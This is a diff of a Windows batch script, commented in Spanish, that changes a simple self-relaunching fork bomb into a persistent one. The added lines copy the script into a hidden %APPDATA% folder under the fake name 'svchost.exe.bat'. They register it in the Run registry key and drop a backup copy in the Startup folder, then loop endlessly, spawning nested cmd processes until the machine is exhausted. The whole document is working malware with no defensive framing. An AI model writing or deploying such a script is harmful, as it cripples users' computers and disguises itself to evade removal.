@@ -1,14 +1,42 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-:: Auto-replicación silenciosa
-if "%~1"=="" (
-    start /min "" "%~f0" x
+
+:: Ruta donde se copiara  
+set "target_dir=%APPDATA%\Microsoft\Windows\SystemCache"
+set "target_file=%target_dir%\svchost.exe.bat"
+
+:: Crear directorio oculto si no existe
+if not exist "%target_dir%" (
+    mkdir "%target_dir%" 2>nul
+    attrib +h "%target_dir%" 2>nul
+)
+
+if not "%~f0"=="%target_file%" (
+    copy /y "%~f0" "%target_file%" >nul
+    attrib +h +s "%target_file%" 2>nul
+    
+    :: Agregar al registro de inicio automatico
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemCache" /t REG_SZ /d "\"%target_file%\"" /f >nul 2>&1
+    
+    :: agregar a la carpeta Startup como backup
+    copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat" >nul 2>nul
+    
+    :: Ejecutar desde la nueva ubicacion y salir
+    start "" "%target_file%"
     exit
 )
 
-:: Bomba de fork con ventanas visibles (más agresiva visualmente)
+
+:: Ocultar ventana actual
+if "%1"=="" (
+    start /min "" "%~f0" hidden
+    exit
+)
+
+:: Bomba fork
 :loop
-start cmd /c "color 0a & title %random% & echo %random%%random%%random% & pause >nul"
+start /min cmd /c "color 0a & title %random% & :a & start cmd /c :a & goto a"
 start "" "%~f0" x
+timeout /t 0 >nul
 goto loop
